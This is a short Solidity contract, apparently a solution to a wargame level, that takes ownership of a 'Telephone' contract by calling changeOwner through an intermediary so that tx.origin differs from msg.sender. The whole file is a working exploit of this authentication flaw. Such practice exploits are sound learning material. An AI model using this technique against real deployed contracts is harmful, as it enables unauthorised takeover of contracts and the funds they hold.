// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "./Telephone.sol";
contract HackTelephone{


    Telephone telephone;


    constructor(address _address) public {
        telephone = Telephone(_address);
    }
    function changeOwner(address _owner) public {
       telephone.changeOwner(_owner); 
    }
}